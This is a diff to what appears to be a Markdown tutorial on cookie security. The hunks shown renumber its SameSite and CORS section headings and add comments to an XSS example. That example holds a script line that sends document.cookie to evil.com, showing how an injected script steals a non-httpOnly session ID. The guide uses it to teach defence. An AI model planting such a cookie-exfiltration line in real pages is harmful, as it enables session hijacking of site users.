@@ -90,7 +90,7 @@ Nothing special happens. Browsers only attach cookies that belong to the domain 
 
 ---
 
-# Part 5 — CORS: the second layer for GET requests
+# Part 4 — CORS: the second layer for GET requests
 
 As noted above, under `SameSite=Lax` a cross-site GET can include cookies. An attacker **can** trigger a GET to your site and the request will reach the server and be processed. But modern browsers implement **CORS** to prevent unauthorized websites from **reading** those responses.
 
@@ -157,7 +157,7 @@ app.use(cors({
 
 ---
 
-# Part 7 — `SameSite` vs CORS — the complete picture
+# Part 5 — `SameSite` vs CORS — the complete picture
 
 They protect different attack surfaces:
 
@@ -243,9 +243,12 @@ console.log(document.cookie);
 However, if an attacker can run JavaScript on your site (XSS), the attacker can still steal non-`httpOnly` cookies:
 
 ```html
+You are on the bank.com &&
+The hacker manage to embedded a line in JavaScipt.
 <script>
   fetch('http://evil.com/steal?cookie=' + document.cookie);
   // This can leak sessionId if sessionId is not httpOnly
+  // On Bank.com, You send Your Session ID to evil.com
 </script>
 ```
 
